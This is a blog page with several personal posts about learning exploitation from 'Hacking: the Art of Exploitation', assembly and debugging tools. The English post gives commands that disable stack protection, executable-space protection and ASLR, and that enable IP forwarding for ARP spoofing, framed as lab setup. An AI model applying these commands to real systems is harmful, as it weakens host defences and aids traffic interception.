          </span>
        
      
    </div>

    <footer class="post-footer">
      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
      

  
  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/reviews/2013/06/09/hacking-the-art-of-exploitation/" itemprop="url">
                  Hacking: the Art of Exploitation
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            发表于
            <time itemprop="dateCreated" datetime="2013-06-09T00:00:00+08:00" content="2013-06-09">
              2013-06-09
            </time>
          </span>

          
            <span class="post-category" >
              &nbsp; | &nbsp; 分类于
              
                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
                  <a href="/categories/reviews/" itemprop="url" rel="index">
                    <span itemprop="name">reviews</span>
                  </a>
                </span>

                
                

              
            </span>
          

          
            
              <span class="post-comments-count">
              &nbsp; | &nbsp;
              <a href="/reviews/2013/06/09/hacking-the-art-of-exploitation/#comments" itemprop="discussionUrl">
                <span class="post-comments-count disqus-comment-count" data-disqus-identifier="reviews/2013/06/09/hacking-the-art-of-exploitation/" itemprop="commentsCount"></span>
              </a>
            </span>
            
          

          

        </div>
      </header>
    


    <div class="post-body">

      
      

      
        
          <span itemprop="articleBody">
            
              <p>This book’s C part is very fascinating. Along with the author, you can actually achieve a set of note take and search tools for multiuser, and an interesting game. What’s more, some linux/unix knowledge will be learned.</p>
<p>So I tried it.</p>
<p>To try these interesting things written in five years ago is not easy on my x86_64 gentoo linux. There are tons of difference and I’m always confused by what I don’t know. However, I was so happy with such interesting things after so much pains.</p>
<p>This book makes C fascinating to me! I’m so desired to be a C hacker!</p>
<p>Thanks to the author–Jon Erickson! Even too simple and fundamental, the book open the door to a interesting world for me.</p>
<hr>
<p><strong>TOC</strong></p>
<ul>
<li>toc<br>{: toc}</li>
</ul>
<hr>
<h2 id="Experiment_Notes_on_A_64-bit_Machine">Experiment Notes on A 64-bit Machine</h2><h3 id="Format_for_Pointer">Format for Pointer</h3><p>pointer/address to be <code>%p</code> not <code>0x%08x</code>.</p>
<h3 id="Compile_32-bit_Programs_on_a_x86_64_Machine">Compile 32-bit Programs on a x86_64 Machine</h3><p>By default, gentoo linux amd64 will set <code>multilib</code> USE flag. You’ll have a multilib glibc and gcc. Then to compile and link a program with gcc, just add <code>-m32</code> parameter to gcc.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -m32 test.c</span><br></pre></td></tr></table></figure>
<h3 id="Built-in_Functions_in_Gcc">Built-in Functions in Gcc</h3><p>gcc actually have some functions built into it. It will use its built in version for some functions like <code>printf</code>. Even if you forget include header files, it will be compiled but give out a warning.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">~/Work/project/hack ⮀ gcc -g -m32 -o firstprog firstprog.c</span><br><span class="line">firstprog.c: In <span class="keyword">function</span> ‘main’:</span><br><span class="line">firstprog.c:<span class="number">7</span>:<span class="number">5</span>: warning: incompatible implicit declaration of built-in <span class="keyword">function</span> ‘<span class="built_in">printf</span>’ [enabled by default]</span><br></pre></td></tr></table></figure>
<h3 id="Disable_SSP">Disable SSP</h3><p>To test hacking skills like stack overflow and so on on a modern x86_64 machine. You have to cheat.To disable the stack smashing prevention(SSP) by gcc, you can simply specify a parameter <code>-fno-stack-protector</code></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -fno-stack-protector test.c</span><br></pre></td></tr></table></figure>
<h3 id="Disable_Executable_Space_Protection">Disable Executable Space Protection</h3><p>To let the stack be executable, you have two choices:</p>
<ol>
<li>add <code>-z execstack</code> parameter to gcc when compiling.</li>
<li>Using <code>execstack</code> to set executable stack flag of ELF binaries and shared libraries</li>
</ol>
<p>Both will work, It depend on you which to choose.</p>
<h3 id="Disable_ASLR">Disable ASLR</h3><p>If you check the book carefully later, you’ll find some technics to prevent exploitation. One of them is ASLR.</p>
<p>To disable (Address space layout randomization)ASLR globally:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo <span class="number">0</span> &gt; /proc/sys/kernel/randomize_va_space</span><br></pre></td></tr></table></figure>
<p>Or just run the binary file using <code>setarch</code>.</p>
<p>Please refer to the References and <code>man setarch</code>.</p>
<h3 id="The_virtual_Memory">The virtual Memory</h3><p>One of my observation is that if you run a 32-bit program on 64-bit system, the address in the memory will differ a lot from just 32-bit system.</p>
<p>According to my experience, the memory address ranges from about <code>0x804a014</code> to <code>0xffffdff8</code>, <code>.data</code> and <code>.bss</code> will locate at around <code>0x804axxx</code>. But the stack bottom will be at around <code>0xff7fcxxx</code>. What’s important is that environment variables will be at the bottom of memory until <code>0xffffdff8</code>. <code>0xffffdff8</code> will be the <code>filename</code> of the execute file.</p>
<p>There are some other differences from the book. One of these is the length of file change 1, the address of environment variable for shellcode will change 1 byte.</p>
<p>I don’t know why things like this, I’ll try to find more about it and ask it at StackOverflow. But that’s what I get after several tests, your machine may differ.</p>
<h3 id="About_dtors_section">About dtors section</h3><p>I find I can’t success on the exploitation about dtors. The destruction function address will be in <code>.fini_array</code> section. Note: objdump will show addresses in little endian. So address <code>0x08048473</code> will looks like that:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Contents of section .fini_array:</span><br><span class="line"> <span class="number">8049</span>ef8 <span class="number">73840408</span>                             s...</span><br></pre></td></tr></table></figure>
<p>Furthermore, because of cpu’s NX feature, when you try to modify <code>.dtors</code> or <code>fini_array</code> section, you’ll just get a segfault.</p>
<h3 id="libnet-1-0_on_amd64">libnet-1.0 on amd64</h3><p>Last thing I have to mentioned is that libnet-1.0 use too much <code>u_long</code>. <code>u_long</code> will take 8 bytes on a 64-bit machine but 4 bytes on a 32-bit one.</p>
<p>You have to care about that because it will build tcp header with incorrect length of source address and destination address.</p>
<p>I don’t know how nemesis(which depends on libnet-1.0) works well on amd64 machines…</p>
<p>To compile and link with libnet-1.0 on gentoo amd64 architecture, try something like this:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc `libnet-<span class="number">1.0</span>-config --defines` -o rst_hijack rst_hijack.c -lnet-<span class="number">1.0</span> -lpcap</span><br></pre></td></tr></table></figure>
<h3 id="Enable_IP_Forward">Enable IP Forward</h3><p>When you want to try arp sproofing or arp poisoning, enable the ip forward for the kernel:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="number">1</span> &gt; /proc/sys/net/ipv4/ip_forward</span><br></pre></td></tr></table></figure>
<h3 id="drop_previledge">drop previledge</h3><p>bash version 2 will drop previlege when run with setuid. So lots of root shell will falls to normal user without <code>setresuid</code>.</p>
<h3 id="Some_other_things">Some other things</h3><p>Examine by <code>man</code> before you try the program in this book. </p>
<p>For example, in <code>update_info</code>, add <code>(void *)</code> in to avoid warning. In <code>connectback_shell.s</code> the <code>connect</code> syscall won’t save file descriptor in eax. Lots of <code>include</code> was lost in this book…</p>
<h2 id="Some_Other_Thoughts_on_This_Book">Some Other Thoughts on This Book</h2><p>Amazing！！When You first get a root shell in an exploitation, you can’t stop jumping out of the chair! The book is simple and introductory, but both interesting and insight. I really like it.</p>
<h2 id="Hacker’s_Tools">Hacker’s Tools</h2><blockquote>
<p>Man is most important, Google is the second.</p>
<p>Prof. Li Yinong</p>
</blockquote>
<p>Consult to <code>man</code> if you are stuck, then search in google(NOT BAIDU).</p>
<ul>
<li>gcc to compile</li>
<li>gdb to debug/attach, use as calculation and so on.</li>
<li>objdump to be used as a disassembler to view executable in assembly form</li>
<li>nm to list symbols in many kinds of files</li>
<li>perl for one line exploitation</li>
<li>python for one line exploitation</li>
<li>hexdump to dump binary files into hex</li>
<li>shell to facilitate with exploitation.</li>
<li>many unix tools like od/sed/awk/bc and so on may be useful.</li>
</ul>
<p>About net hack, You may like to use:</p>
<ul>
<li>libnet to inject packets</li>
<li>libpcap to capture packets</li>
<li>tcpdump to capture and show packets</li>
<li>dsniff to sniff the net and arp poison</li>
<li>netcat, wow, swiss knife</li>
<li>telnet, a good client to use</li>
<li>ettercap/nessus/metasploit and so on.</li>
</ul>
<h2 id="Some_References">Some References</h2><p>About exploitation:</p>
<ul>
<li><a href="https://crypto.stanford.edu/~blynn/rop/" target="_blank" rel="external">Return-oriented programming on 64-bit Linux</a></li>
<li><a href="http://www.exploit-db.com/papers/24085/" target="_blank" rel="external">Stack Smashing On A Modern Linux System</a></li>
<li><a href="http://www.tenouk.com/Bufferoverflowc/" target="_blank" rel="external">The Stack-based Buffer Overflow Hands-on Tutorials</a></li>
<li><a href="http://duartes.org/gustavo/blog/post/anatomy-of-a-program-in-memory" target="_blank" rel="external">Anatomy of a Program in Memory</a></li>
<li><a href="http://www.tenouk.com/ModuleW.html" target="_blank" rel="external">COMPILER, ASSEMBLER, LINKER AND LOADER: A BRIEF STORY</a></li>
<li><a href="http://security.stackexchange.com/questions/20497/stack-overflows-defeating-canaries-aslr-dep-nx" target="_blank" rel="external">Discuss on stack exchange</a></li>
<li><a href="https://www.cs.umd.edu/class/fall2012/cmsc498L/materials/vuln-lab.shtml" target="_blank" rel="external">Shellcode/buffer overflow lab</a></li>
<li><a href="http://www.csee.umbc.edu/~chang/cs313.s02/stack.shtml" target="_blank" rel="external">C Function Call Conventions and the Stack</a></li>
<li><a href="https://www.ibm.com/developerworks/cn/linux/l-overflow/" target="_blank" rel="external">Linux下缓冲区溢出攻击的原理及对策(中文)</a></li>
</ul>
<p>About packet capture and injection:</p>
<ul>
<li><a href="http://networksecurity.org.ua/0596007949/toc.html" target="_blank" rel="external">Network Security Tools(chapter 10 and 11 are about libnet/libpcap)</a></li>
<li><a href="http://www.tcpdump.org/pcap.html" target="_blank" rel="external">Programming with pcap</a></li>
<li><a href="http://yuba.stanford.edu/~casado/pcap/section1.html" target="_blank" rel="external">The Sniffer’s Guide to Raw Traffic</a></li>
</ul>
<p>About arpspoofing:</p>
<ul>
<li><a href="http://www.irongeek.com/i.php?page=security/arpspoof" target="_blank" rel="external">The Basics of Arpspoofing/Arppoisoning</a></li>
</ul>
<p>About shellcode</p>
<ul>
<li><a href="http://www.vividmachines.com/shellcode/shellcode.html" target="_blank" rel="external">Shellcoding for Linux and Windows Tutorial</a></li>
</ul>

            
          </span>
        
      
    </div>

    <footer class="post-footer">
      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
      

  
  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/life/2013/06/01/recent-summary/" itemprop="url">
                  Recent Summary
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            发表于
            <time itemprop="dateCreated" datetime="2013-06-01T00:00:00+08:00" content="2013-06-01">
              2013-06-01
            </time>
          </span>

          
            <span class="post-category" >
              &nbsp; | &nbsp; 分类于
              
                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
                  <a href="/categories/life/" itemprop="url" rel="index">
                    <span itemprop="name">life</span>
                  </a>
                </span>

                
                

              
            </span>
          

          
            
              <span class="post-comments-count">
              &nbsp; | &nbsp;
              <a href="/life/2013/06/01/recent-summary/#comments" itemprop="discussionUrl">
                <span class="post-comments-count disqus-comment-count" data-disqus-identifier="life/2013/06/01/recent-summary/" itemprop="commentsCount"></span>
              </a>
            </span>
            
          

          

        </div>
      </header>
    


    <div class="post-body">

      
      

      
        
          <span itemprop="articleBody">
            
              <p>这里越来越不是技术博客了，越来越像博主个人的记事本而不像分享技术的地方了。</p>
<p>总之，由于身体健康的考虑和对妹子的向往等一系列原因，我坚定地决定珍爱生命，远离计算机。但对一个热衷于折腾的人这项正确伟大光明的方针就是空头支票，实践的一点也不好。</p>
<p>最初还好，天天往返于图书馆一教与寝室，一天不怎么回去。忙着看妹子，看书。看看《别逗了，费曼先生》，对费曼真是崇拜得五体投地。然而愈发的感觉到自我的平庸和碌碌无为。</p>
<h2 id="考研后的学习">考研后的学习</h2><p>最近忙着看《Hacking：the Art of Exploition》,感觉里面讲C语言的部分太好了，深浅合适，不会像C语言圣经那么假设您已经有一定深度，也不会像国内的一堆C教材把简单的语言搞得复杂到让人望而却步。作者从最最基本的程序设计思想开始讲，循序渐进地引入C的语法和概念，精巧的例子相当助于理解而且充满意趣。更重要的事，结合着一些基本的汇编讲解让人对C的理解有了更高的高度。<a href="吐槽下当初那些拿着天花乱坠术语讲解着莫名其妙的原理的VB教材，直接把我对计算机的兴趣给毁了。">^1</a>我觉得任何一本优秀的教材、一篇优秀的教程，一份优秀的文档，都具有该书作者那种平易近人，循序渐进，深浅适度并且充满着意趣和爱的风格。可惜，天朝几十年的教育风格简直就是为了毁掉人们对丰富多彩科学与艺术的热爱。</p>
<p>汇编语言我觉得到此为止，那本《Professional Assembly Language》也是一篇优秀的教程，清晰、平易、深入浅出，注重实践。当把一本书大部分汇编代码在我的Linux机器下实践后我决定不再深入研究某些章节，比如FPU计算、SSE和SSE2和SSE3，因为80%的实际情况下您只需要用到20%的知识，基本的汇编知识已经足够应付大多数场景，其它东西真心别指望记住也至今没用到过。</p>
<p>学习汇编感觉一大好处是回头看C清晰了许多，对计算机和操作系统的理解也更加深入，当然对调试也是大有裨益。基本是汇编那本书里我才学习和习惯了工具集比如objdump/gdb/gcc等等。顺便推荐下kdbg作为gdb前端。虽然我更喜欢直接用gdb。</p>
<p>以前只喜欢更加抽象的语言比如lisp和python，事实上最开始只是随手看看有关Python的书却引起了对调试器的兴趣，最后发现gdb太好玩了。现在却也很喜欢C和汇编了，它们简洁而强大，却构成了所有上层抽象的基础。</p>
<p>另外需要强调的是，实践和理论是两码事。看作者讲的时候觉得一清二楚，水到渠成。真正到了到自己的机器上实践时却困难重重。这本书有些老是一方面，但另一方面动手本来就不是这么简单的事。</p>
<p>稍微记下我碰到的一些问题，如果您能有何指教，万分感谢：</p>
<h3 id="在64位下编译32位汇编程序">在64位下编译32位汇编程序</h3><p>书中基本都是32位程序，其实差别也不大，只不过寄存器的名字变成rip，rap什么的，但为了学习方便我还是选择编译32位程序。</p>
<p>首先系统要支持32位(拥有32位库文件，比如glibc和gcc在gentoo中使用multilib的USE标记。或者archlinux添加multilib仓库并安装32位glibc和gcc)，CPU通常64位都能运行在32位兼容模式。</p>
<p>使用gas进行汇编程序编译和链接如下：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">as --<span class="number">32</span> -gstabs -o paramtest2.o paramtest2.s</span><br><span class="line">ld -dynamic-linker /lib/ld-linux.so.<span class="number">2</span> -melf_i386 -o paramtest2 -lc paramtest2.o</span><br></pre></td></tr></table></figure>
<p>对<code>as</code>其中 <code>--32</code> 是架构，-gstabs是要编译时保存调试符号以供将来用gdb调试时查看，<code>-o</code>后面是目标文件名。</p>
<p>对ld来说<code>-dynamic-linker</code>指定了链接的动态库位置，<code>-lc</code>后面是你要读取和连接的目标文件。如果没有使用C库函数没必要连接上，可以仅仅<code>ld -o functest4 functest4.o area.o</code>。<code>-melf_i386</code>指定了架构。</p>
<p>使用gcc编译汇编程序时可以一次完成编译和连接，我通常倾向于这种方式。注意，gcc是以<code>main</code>作为标志来编译的。这样做虽然省事，但gcc实际上做了很多你可能并不希望它去做的事，以致于用它编译和连接的程序在查看堆栈时会让你完全看不懂。gcc默认连接动态库，所以在你的汇编程序使用C标准库时用gcc会很方便。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -g -m32 -o paramtest3 paramtest3.s</span><br></pre></td></tr></table></figure>
<p><code>-g</code>用来保存调试符号，<code>-m32</code>用来指定使用32位模式。</p>
<h2 id="调试时一些问题">调试时一些问题</h2><p>当你尝试书中的C程序时很可能会碰到很多疑问。比如反汇编的时候发现printf变成了puts。gcc默认开启一些优化选项，并且gcc会将许多C库函数用它自己内置的函数替代。这使你无法stepinto某个库函数，也无法在库函数中设置断点。为了防止gcc这么做，你可以加上<code>-fno-builtin</code>参数[^2]。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -g -fno-builtin -m32 -o funcptr_example funcptr_example.c</span><br></pre></td></tr></table></figure>
<p>之后就可以在gdb中在诸如strcpy函数设置断点，并且可以step into这些库函数了。</p>
<p>但也未必，你需要安装glibc的调试文件。</p>
<p>如果gdb叫你检查/usr/lib/debug目录并且glibc中函数名称无法显示只是<code>??</code>，那么您八成是没有安装调试符号。其它linux发行版你也许只要安装调试符号就行。但gentoo中，情况稍微复杂些。在gentoo中可以添加上<code>debug</code>USE标记，但这还不够，在<code>make.conf</code>中需要添加一条特性：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/portage/make.conf |grep FEATURES</span><br><span class="line">FEATURES=<span class="string">"splitdebug"</span></span><br></pre></td></tr></table></figure>
<p>之后emerge你的glibc，然后<code>/usr/lib/debug/</code>下就有调试符号了。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ls /usr/lib/debug/ </span><br><span class="line">lib32  lib64  sbin  usr</span><br></pre></td></tr></table></figure>
<h2 id="缓冲区溢出">缓冲区溢出</h2><p>在实践第三章简单缓冲区溢出时发现虽然用户数据很容易覆盖，但妄图覆盖堆栈的返回地址的行为却屡屡失败(指<code>exploit_notesearch</code>程序)。我google了下，原因有以下几种：</p>
<ol>
<li><a href="http://en.wikipedia.org/wiki/Address_space_layout_randomization" target="_blank" rel="external">ALSR</a>，现代操作系统中有了更健全的保护系统来阻止黑客计算出正确的地址。该特性可以在<code>/proc/sys/kernel/randomize_va_space</code>中写入0来关闭。</li>
<li>在大多数64位系统中，可能在较新的linux内核，妄图通过另一个程序来挖掘计算程序地址的企图是不怎么可行的。两个程序(<code>exploit_notesearch</code>和<code>notesearch</code>根本不运行在同一个虚拟内存空间)。<a href="[评论部分有讨论这个，我是在另外一个地方看到，但找不到链接了](http://stackoverflow.com/questions/8696517/buffer-overflow-example-from-art-of-exploitation-book)">^4</a></li>
<li><a href="http://en.wikipedia.org/wiki/Buffer_overflow_protection" target="_blank" rel="external">Gcc的堆栈保护</a>，据说可以通过像gcc添加参数<code>-fno-stack-protector</code>来取消某些保护[^3]。但我的gcc好像就没这个参数。</li>
<li>还有一大票其它短期内你永远也搞不清的安全机制。</li>
</ol>
<p>在换32位测试无力后，我默默爬上海盗湾准备找到个古老的书籍配套livecd来动手实践下。虽然都是些过时的技术，但看上去仍然相当有趣。</p>
<p>更多有意思的讨论参见<a href="http://stackoverflow.com/questions/1851293/what-are-some-advanced-and-modern-resources-on-exploit-writing" target="_blank" rel="external">这里</a>，三年前的老讨论。哈哈，我这里有shellcoder‘s handbook. </p>
<h2 id="Coursera课程">Coursera课程</h2><p>基本上High performance scientific computing被放弃了，我已经落下将近两周。Fortran/makefile那里停下来，将来再看吧。</p>
<p>Machine Learning继续跟进，视频，作业，动手实践。不过我都压缩到两天完成一周的任务了……</p>
<h2 id="其它">其它</h2><ul>
<li>在百度贴吧Linux吧获得成就：<em>wps黑开源大喷子</em></li>
<li>偶尔在byr论坛水水，一群人投票讨论nuanyangyang是不是妹子= =</li>
<li>每天活动活动</li>
<li>下载了IDA pro免费版，看了看，确实比objdump方便强大多了……虽然没什么可比性……</li>
<li>下载并看了下Immunity debugger，虽然感觉很厉害的样子，却几乎一点不会用。后来看到《A Bug Hunter’s Diary》中作者用immunity debugger！</li>
<li>随意试了下linux下的fork尝试实现调试器启动进程的功能，不知道怎么挂住程序让它别运行……后来也没再查资料和折腾这个。</li>
</ul>
<p>其它，没什么好说的。</p>
<h2 id="FootNotes">FootNotes</h2><p>[^2]: <a href="http://stackoverflow.com/questions/15306090/cant-step-into-string-h-function-with-gdb" target="_blank" rel="external">Can’t step into string.h function</a><br>[^3]: <a href="http://stackoverflow.com/questions/13024977/the-art-of-compiler-on-buffer-overflow" target="_blank" rel="external">The Art of Compiler on Buffer Overflow</a></p>

            
          </span>
        
      
    </div>

    <footer class="post-footer">
      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
      

  
  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/reviews/2013/05/16/some-books/" itemprop="url">
                  我是如何浪费生命
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            发表于
            <time itemprop="dateCreated" datetime="2013-05-16T00:00:00+08:00" content="2013-05-16">
              2013-05-16
            </time>
          </span>

          
            <span class="post-category" >
              &nbsp; | &nbsp; 分类于
              
                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
                  <a href="/categories/reviews/" itemprop="url" rel="index">
                    <span itemprop="name">reviews</span>
                  </a>
                </span>

                
                

              
            </span>
          

          
            
              <span class="post-comments-count">
              &nbsp; | &nbsp;
              <a href="/reviews/2013/05/16/some-books/#comments" itemprop="discussionUrl">
                <span class="post-comments-count disqus-comment-count" data-disqus-identifier="reviews/2013/05/16/some-books/" itemprop="commentsCount"></span>
              </a>
            </span>
            
          

          

        </div>
      </header>
    


    <div class="post-body">

      
      

      
        
          <span itemprop="articleBody">
            
              <p>毕业季，把毕设某Goldstein算法和FFT最小二乘算法实现后就扔了，借了一大堆逆向汇编调试的书。</p>
<p>我想让大家看看我是如何瞎折腾最终浪费生命一事无成的，请大家从这个反例中吸取经验教训，珍爱生命，远离折腾。</p>
<blockquote>
<p>专心赚钱和把妹，别搞些没用的。</p>
<p>中国谚语</p>
</blockquote>
<h2 id="Gray_Hat_Python">Gray Hat Python</h2><p>跳坑从一本Python灰帽子开始，因为对Python的熟悉和兴趣加上某种机缘巧合，从图书馆借来看了一阵。</p>
<p>首先是开发环境的搭建，据作者说搭建开发环境是个痛苦而无聊的过程。对新手很棘手、很消磨斗志和耐心。但对我这样已经在Linux下被虐过多少遍的人完全没感觉了，即使在windows上也轻车熟路装好Python。唯一不爽的地方在于，作者说windows下调试乐趣横生所以不考虑linux，我只好装了个虚拟机xp玩。当然，作为有个性的Linuxer，我的做法是在linux宿主机编辑文件共享给windows虚拟机用，真尼玛蛋疼。</p>
<p>接着就是些基本理论，通过这本书我第一次发现原来Python和C集成的这么好，于是把Python C API翻译了一遍……后来在《Unix设计艺术》中看作者说Python最开始设计就是为了跟C集成……</p>
<p>总之，Python强大的C外挂= =。但总有些不舒服的地方，尼玛Windows和Unix函数参数进栈顺序……</p>
<p>再往后是调试器设计的基本知识，卧槽啊，第一次了解CPU，那个看得一愣一愣的，几次差点睡着。最后看了好几遍又回头了好几遍又看了好几本其它书讲才总算知道有几个寄存器且有什么用栈是什么软硬件断点实现，现在什么平坦内存模型内存断点堆是什么还是搞不清，传说中的Intel开发者手册更是没勇气去看。</p>
<p>接着就开始在虚拟机xp上开始照着自己写调试器了，好在作者对各种Win32 API讲得清清楚楚明明白白，又在网上提供源码和各种结构定义。不然您看着满目错误的中文版就跪吧。照着网上提供的代码试了不知道多久终于把这个向pygdb致敬的调试器写出来了。</p>
<p>不过Win32 API完全给我看跪了。在byr上看有人说Linux的系统调用比windows好懂[^1]。最开始还想将这个具简单的调试器移植到linux下看看，然而，现在还什么都没看。</p>
<p>之后，慢慢看吧，还没动手，用pygdb部署软钩子，进程快照和回滚，处理非法内存操作貌似很厉害的样子……</p>
<p>再往后看到用Immudbg针对特定shellcode寻找漏洞，我觉得得回头找点其它书补补相应知识了，很难看懂作者在说什么了……于是，IDA pro</p>
<h2 id="IDA_Pro">IDA Pro</h2><p>前面讲汇编和IA-32处理器，栈及堆的基本原理可执行文件的区段指令集啥的，看得云里雾里，不知道是因为看雪翻译的问题还是我弱爆了……</p>
<p>看到PE格式和ELF格式文件格式细节完全跪了没，最终也没理解什么GOT/PLT，动态链接成员结构啥的链接加载啥的……然后就跳过了。于是后来看到《Debug Hacks》听作者讲GOT/PLT时又跪了……</p>
<p>接着看了看第一个例子，跟踪执行流。虽然下了一个IDA Pro以供调教，然而终于也没开虚拟机……我说，我还是回头看看汇编在来看例子吧……于是这本书又暂时按下。</p>
<h2 id="Debug_Hacks">Debug Hacks</h2><p>一本日本人写的书，风格清新脱俗，平易近人。看讲gdb那货直接把我迷住了，哇草啊，gdb这么好玩啊，哇草啊，比我写的那啥调试器强大多了。</p>
<p>看到byr挂站排行榜脑子一抽写了个byr挂站脚本扔到Luoyun云平台上，结果web-ssh关掉了看不到标准输出了。然后竟然在Stack Overflow上看到有人用gdb来重定向程序输出，尼玛啊，这瞬间就感觉调试器无敌了。</p>
<p>结果就是，在看到这本主要讲linux平台调试的书时顿时爱不释手，特别是前几章讲gdb的，再加上几个例子太好玩了。</p>
<p>最sb的事接着来了，参照书上写了个对NULL写入的Linux内核模块接着竟然在宿主机上加载了……卧槽，久违的kernel panic。好吧，正好复习下reisub大法，可是它没重启动，最后还是长按关机键……</p>
<p>后面讲crash倒兴致了然了，虽然在gentoo上顺手装上，却没啥动力让系统吐核……虚拟机又懒得开。</p>
<p>顺口吐槽，原来pdb这么像gdb啊……</p>
<p>不过还是好多不懂，linux下线程共享资源，看得完全跪掉了，现在也没搞明白怎么回事。</p>
<p>gdb或objdump反汇编出来的汇编代码语法是AT&amp;T的，和Intel差别还挺大，之前讲windows的IDA pro和Gray Hat Python都是Intel语法……我喜欢AT &amp; T</p>
<p>于是抛弃了几本讲MSMA和NSMA的书选择了《Professional Assembly Language》。</p>
<h2 id="Professional_Assembly_Language">Professional Assembly Language</h2><p>一本完全遵循AT&amp;T语法，在linux平台下，实用gcc/gdb/ld/as/gas/grof等工具的书啊。</p>
<p>第一个例子无压力通过，虽然不了解语法云里雾里，但之前硬件基础讲解还是很棒的，就是只是32位的，我的系统是64兼容32位，有时候要加些参数。相比而言，在这个问题上只有《Debug Hacks》做的好，64位和32位都讲得挺清楚。</p>
<p>打算接着熟悉下指令</p>
<p>再接着打算看看Linux系统调用。回头学习Linux去= =</p>
<p>以上只是打算……</p>
<h2 id="K_&amp;_R">K &amp; R</h2><p>为什么乱入了一本书，带着浓重Unix风格的C语言圣经。为了看懂那些书中的例子在调试些什么C程序，只好翻K &amp; R去了。</p>
<p>K &amp; R也许真不适合入门，但我还是想给初学者推荐(莫喷……)。</p>
<p>听说K &amp; R不符合C 99规范，暂不管它，Fortran这规范都2008了也没听说哪个编译器实现了，还有好多东西还是Fortran77。gcc不报Warning就好。</p>
<h2 id="Coursera">Coursera</h2><p>最不能理解的是，这个时候还跑去看High Performance Scientific Computing和Machine Learning。开着八线程学Fortran和Octave(matlab)。</p>
<h2 id="Summary">Summary</h2><p>大概就是这样，被我浪费掉的，这么多人都忙着旅行恋爱的享受最后青春的，我选择的，大学最后光阴。</p>
<p>大家跟我一起唱：</p>
<pre><code><span class="comment">珍爱生命，远离计算机</span>
<span class="comment">珍愛生命，遠離計算機</span>
<span class="comment">Cherish</span> <span class="comment">life</span><span class="string">,</span> <span class="comment">away</span> <span class="comment">from</span> <span class="comment">the</span> <span class="comment">computer</span>
<span class="comment">大切な命のため、コンピュータから離れてください</span>
<span class="comment">Chérir</span> <span class="comment">la</span> <span class="comment">vie</span><span class="string">,</span> <span class="comment">loin</span> <span class="comment">de</span> <span class="comment">l'ordinateur</span>
<span class="comment">Берегите</span> <span class="comment">жизнь</span><span class="string">,</span> <span class="comment">вдали</span> <span class="comment">от</span> <span class="comment">компьютера</span>
<span class="comment">Cherish</span> <span class="comment">Leben</span><span class="string">,</span> <span class="comment">weg</span> <span class="comment">vom</span> <span class="comment">Computer</span>
<span class="comment">컴퓨터에서</span> <span class="comment">멀리</span><span class="string">,</span> <span class="comment">생명을</span> <span class="comment">소중히</span>
<span class="comment">Apreciar</span> <span class="comment">la</span> <span class="comment">vida</span><span class="string">,</span> <span class="comment">lejos</span> <span class="comment">de</span> <span class="comment">la</span> <span class="comment">computadora</span>
<span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="title">[</span>&gt;<span class="literal">+</span>&gt;<span class="literal">+</span><span class="literal">+</span>&gt;<span class="literal">+</span><span class="literal">+</span><span class="literal">+</span>&gt;<span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span>&gt;<span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span>&gt;<span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span>&gt;<span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span>&gt;<span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span>&gt;<span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span 